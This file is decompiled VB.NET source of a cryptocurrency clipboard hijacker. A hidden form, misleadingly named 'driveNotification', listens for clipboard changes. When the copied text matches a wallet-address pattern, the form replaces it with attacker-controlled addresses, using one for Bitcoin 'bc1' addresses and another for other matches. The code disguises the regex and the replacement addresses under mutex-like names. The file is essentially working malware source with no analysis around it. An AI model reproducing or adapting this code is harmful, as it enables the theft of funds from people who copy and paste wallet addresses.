Imports System
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms

Namespace ConsoleApplication7
	' Token: 0x02000004 RID: 4
	Public NotInheritable Class driveNotification
		' Token: 0x02000005 RID: 5
		Public Class NotificationForm
			Inherits Form

			' Token: 0x06000024 RID: 36 RVA: 0x000039C6 File Offset: 0x00001BC6
			Public Sub New()
				Program.NativeMethods.SetParent(MyBase.Handle, Program.NativeMethods.intpreclp)
				Program.NativeMethods.AddClipboardFormatListener(MyBase.Handle)
			End Sub

			' Token: 0x06000025 RID: 37 RVA: 0x000039EB File Offset: 0x00001BEB
			Private Function RegexResult(pattern As Regex) As Boolean
				Return pattern.Match(driveNotification.NotificationForm.currentClipboard).Success
			End Function

			' Token: 0x06000026 RID: 38 RVA: 0x00003A04 File Offset: 0x00001C04
			Protected Overrides Sub WndProc(ByRef m As Message)
				If m.Msg = 797 Then
					driveNotification.NotificationForm.currentClipboard = driveNotification.NotificationForm.GetText()
					If driveNotification.NotificationForm.currentClipboard.StartsWith("bc1") Then
						If Me.RegexResult(Program.appMutexRegex) AndAlso Not driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex) Then
							Dim text As String = Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex)
							driveNotification.NotificationForm.SetText(text)
						End If
					ElseIf Me.RegexResult(Program.appMutexRegex) AndAlso Not driveNotification.NotificationForm.currentClipboard.Contains(Program.appMutex2) Then
						Dim text2 As String = Program.appMutexRegex.Replace(driveNotification.NotificationForm.currentClipboard, Program.appMutex2)
						driveNotification.NotificationForm.SetText(text2)
					End If
				End If
				MyBase.WndProc(m)
			End Sub

			' Token: 0x17000001 RID: 1
			' (get) Token: 0x06000027 RID: 39 RVA: 0x00003AB8 File Offset: 0x00001CB8
			Protected Overrides ReadOnly Property CreateParams As CreateParams
				Get
					Dim createParams As CreateParams = MyBase.CreateParams
					createParams.ExStyle = createParams.ExStyle Or 128
					Return createParams
				End Get
			End Property

			' Token: 0x06000028 RID: 40 RVA: 0x00003AF4 File Offset: 0x00001CF4
			Public Shared Function GetText() As String
				Dim ReturnValue As String = String.Empty
				Dim thread As Thread = New Thread(Sub()
					ReturnValue = Clipboard.GetText()
				End Sub)
				thread.SetApartmentState(ApartmentState.STA)
				thread.Start()
				thread.Join()
				Return ReturnValue
			End Function

			' Token: 0x06000029 RID: 41 RVA: 0x00003B54 File Offset: 0x00001D54
			Public Shared Sub SetText(txt As String)
				Dim thread As Thread = New Thread(Sub()
					Clipboard.SetText(txt)
				End Sub)
				thread.SetApartmentState(ApartmentState.STA)
				thread.Start()
				thread.Join()
			End Sub

			' Token: 0x04000020 RID: 32
			Private Shared currentClipboard As String = driveNotification.NotificationForm.GetText()
		End Class
	End Class
End Namespace
